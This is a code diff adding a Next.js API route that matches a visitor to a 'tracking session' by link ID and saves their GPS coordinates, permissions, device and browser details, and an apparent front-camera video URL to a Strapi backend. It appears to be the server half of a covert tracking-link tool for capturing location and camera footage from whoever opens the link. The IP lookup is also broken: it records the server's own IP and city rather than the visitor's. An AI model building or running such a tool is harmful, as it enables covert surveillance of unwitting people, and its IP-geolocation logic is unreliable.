@@ -1,0 +1,79 @@
+export async function POST(req) {
+  try {
+    const body = await req.json();
+    const { trackingId, locationData, permissions, userAgent, screen, videoUrl } = body;
+
+    const sessionsRes = await fetch(
+      process.env.NEXT_PUBLIC_STRAPI_URL + "/api/tracking-sessions"
+    );
+    const sessionsData = await sessionsRes.json();
+
+    const session = sessionsData.data.find(
+      s => s.tracking_link?.includes(trackingId)
+    );
+
+    if (!session) {
+      return new Response(JSON.stringify({ error: "Session not found" }), { status: 400 });
+    }
+
+    const ipRes = await fetch("http://ip-api.com/json/");
+    const ipData = await ipRes.json();
+
+    const ua = userAgent || "";
+    const os = ua.includes("Windows") ? "Windows"
+      : ua.includes("Mac") ? "MacOS"
+      : ua.includes("Android") ? "Android"
+      : ua.includes("iPhone") || ua.includes("iPad") ? "iOS"
+      : ua.includes("Linux") ? "Linux" : "Unknown";
+
+    const browser = ua.includes("Chrome") ? "Chrome"
+      : ua.includes("Firefox") ? "Firefox"
+      : ua.includes("Safari") ? "Safari"
+      : ua.includes("Edge") ? "Edge" : "Unknown";
+
+    const device_type = ua.includes("Mobile") || ua.includes("Android") || ua.includes("iPhone")
+      ? "Mobile" : "Desktop";
+
+    const saveRes = await fetch(
+      process.env.NEXT_PUBLIC_STRAPI_URL + "/api/tracking-events",
+      {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          data: {
+            session: session.documentId,
+            ip_address: ipData?.query || "unknown",
+            city: ipData?.city || "unknown",
+            country: ipData?.country || "unknown",
+            isp: ipData?.isp || "unknown",
+            latitude: locationData?.latitude ?? null,
+            longitude: locationData?.longitude ?? null,
+            user_agent: userAgent || "unknown",
+            screen_resolution: screen || "unknown",
+            os,
+            browser,
+            device_type,
+            permissions: permissions || {},
+            front_video: videoUrl || null,
+            triggered_at: new Date().toISOString()
+          }
+        })
+      }
+    );
+
+    const saveData = await saveRes.json();
+
+    if (!saveRes.ok) {
+      return new Response(
+        JSON.stringify({ error: "Strapi error", details: saveData }),
+        { status: 400 }
+      );
+    }
+
+    return new Response(JSON.stringify({ success: true }), { status: 200 });
+
+  } catch (err) {
+    console.error("SERVER ERROR:", err);
+    return new Response(JSON.stringify({ error: "Server error" }), { status: 500 });
+  }
+}
